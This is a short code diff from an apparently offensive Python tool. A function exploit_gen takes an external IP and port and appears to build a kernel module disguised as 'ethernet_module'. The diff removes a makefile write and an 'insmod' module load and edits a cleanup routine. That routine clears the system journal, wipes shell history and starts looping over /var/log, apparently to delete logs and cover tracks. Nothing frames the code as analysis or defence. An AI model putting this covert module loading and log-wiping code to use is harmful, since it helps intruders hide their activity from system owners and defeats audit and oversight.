@@ -19,13 +19,11 @@ def exploit_gen(external_ip, external_port, module_name = "ethernet_module", fil
     print(files[1])
 
 def load_module(name):
-    os.system("echo "+ MAKEFILE + " > makefile" )
     os.system("make")
-    os.system("sudo insmod " + name+".ko")
 
 
 def cleanup():
-    os.remove("module.c")
+    os.system(" make clean")
     os.system(" journalctl --vacuum-time=10d")
     os.system(" history -c")
     for file in os.listdir("/var/log"):
